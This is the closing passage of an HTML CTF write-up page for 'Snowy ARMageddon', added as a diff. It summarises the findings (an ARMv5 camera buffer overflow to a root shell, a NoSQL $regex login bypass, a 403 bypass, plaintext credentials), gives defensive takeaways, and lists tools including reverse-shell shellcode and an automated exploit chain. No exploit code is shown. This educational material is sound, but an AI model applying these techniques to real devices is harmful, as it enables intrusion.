+            <div class="vuln-table-wrap"><table class="vuln-table"><thead><tr><th>Finding</th><th>Location</th><th>Severity</th><th>Impact</th></tr></thead><tbody>
+                <tr><td>Stack buffer overflow (no ASLR)</td><td>Camera <code>webs</code> server, <code>basic=</code> param</td><td><span class="sev sev-crit">Critical</span></td><td>Remote code execution, root shell on IoT device</td></tr>
+                <tr><td>NoSQL injection (<code>$regex</code>)</td><td>Port 8080 <code>/login.php</code></td><td><span class="sev sev-crit">Critical</span></td><td>Authentication bypass, arbitrary data access</td></tr>
+                <tr><td>Plaintext credentials in firmware</td><td><code>/var/etc/umconfig.txt</code></td><td><span class="sev sev-high">High</span></td><td>Camera admin password in cleartext</td></tr>
+                <tr><td>403 bypass via trailing slash</td><td>Port 8080 nginx/Apache</td><td><span class="sev sev-high">High</span></td><td>Access restriction completely bypassed</td></tr>
+                <tr><td>Port knock sequence discoverable</td><td>knockd config</td><td><span class="sev sev-med">Medium</span></td><td>Full port scan triggers knock sequence in order</td></tr>
+            </tbody></table></div>
+        </section>
+
+        <!-- TAKEAWAYS -->
+        <section class="writeup-section">
+            <div class="step-header"><div class="step-num"><i class="fas fa-shield-alt" style="font-size:.55rem"></i></div><div><div class="step-label">Defense</div><h2 class="step-title">Takeaways</h2></div></div>
+            <div class="takeaway-grid">
+                <div class="takeaway-card"><div class="takeaway-icon"><i class="fas fa-microchip"></i></div><div class="takeaway-title">IoT Devices Need ASLR</div><div class="takeaway-text">Static library addresses make ROP chains trivially reliable. Embedded Linux builds must enable ASLR and PIE to raise the exploitation bar.</div></div>
+                <div class="takeaway-card"><div class="takeaway-icon"><i class="fas fa-shield-alt"></i></div><div class="takeaway-title">Sanitize MongoDB Queries</div><div class="takeaway-text">When <code>$regex</code> or <code>$ne</code> operators pass through unfiltered, any <code>find()</code> query can be bypassed. Use strict type checking on input.</div></div>
+                <div class="takeaway-card"><div class="takeaway-icon"><i class="fas fa-terminal"></i></div><div class="takeaway-title">ARM Bad Char Encoding</div><div class="takeaway-text">Encode IP/port bytes using <code>mov/lsl/add</code> arithmetic sequences instead of embedding raw bytes. Avoids null, space, and other bad characters in shellcode.</div></div>
+                <div class="takeaway-card"><div class="takeaway-icon"><i class="fas fa-lock"></i></div><div class="takeaway-title">Port Knocking Is Not Security</div><div class="takeaway-text">Knock sequences triggered by sequential port scans provide zero protection. Use proper authentication instead of security through obscurity.</div></div>
+            </div>
+        </section>
+
+        <!-- TOOLS -->
+        <section class="writeup-section">
+            <div class="step-header"><div class="step-num"><i class="fas fa-wrench" style="font-size:.55rem"></i></div><div><div class="step-label">Arsenal</div><h2 class="step-title">Tools Used</h2></div></div>
+            <div class="vuln-table-wrap"><table class="vuln-table"><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody>
+                <tr><td><code>nmap</code></td><td>Port scanning, service enum, accidental port knock trigger</td></tr>
+                <tr><td><code>pwntools</code></td><td>Cyclic pattern, offset calculation, payload construction</td></tr>
+                <tr><td><code>custom ARM shellcode</code></td><td>ARMv5 reverse TCP shell with bad char avoidance</td></tr>
+                <tr><td><code>netcat</code></td><td>Reverse shell listener</td></tr>
+                <tr><td><code>python3 + requests</code></td><td>NoSQL injection, port polling, exploit delivery</td></tr>
+                <tr><td><code>snowy_armageddon_auto.py</code></td><td>Full automated exploit chain</td></tr>
+            </tbody></table></div>
+        </section>
+
+    </main>
+
+    <footer class="footer">
+        <p class="footer-text"><span>[0xb0rn3]</span> &middot; CTF Writeup &middot; Snowy ARMageddon &middot; <span>ARMv5 BOF + NoSQL injection &rarr; 2 flags</span></p>
+    </footer>
+
+    <button class="scroll-top" id="scrollTop" aria-label="Scroll to top"><i class="fas fa-chevron-up"></i></button>
+
+    <script>
+    'use strict';
+    const scrollBar=document.getElementById('scrollBar'),navbar=document.getElementById('navbar'),scrollTop=document.getElementById('scrollTop');
+    window.addEventListener('scroll',()=>{const h=document.documentElement.scrollHeight-window.innerHeight;scrollBar.style.width=((window.scrollY/h)*100)+'%';navbar.classList.toggle('scrolled',window.scrollY>50);scrollTop.classList.toggle('show',window.scrollY>400);},{passive:true});
+    scrollTop.addEventListener('click',()=>window.scrollTo({top:0,behavior:'smooth'}));
+    const io=new IntersectionObserver(entries=>{entries.forEach((e,i)=>{if(e.isIntersecting){e.target.style.transitionDelay=`${i*60}ms`;e.target.classList.add('visible');io.unobserve(e.target);}});},{threshold:.05,rootMargin:'0px 0px -30px 0px'});
+    document.querySelectorAll('.writeup-section').forEach(el=>io.observe(el));
+    function copyCode(btn){const code=btn.closest('.code-block').querySelector('pre').textContent;navigator.clipboard.writeText(code).then(()=>{btn.textContent='Copied!';btn.classList.add('copied');setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied');},2000);});}
+    </script>
+</body>
+</html>
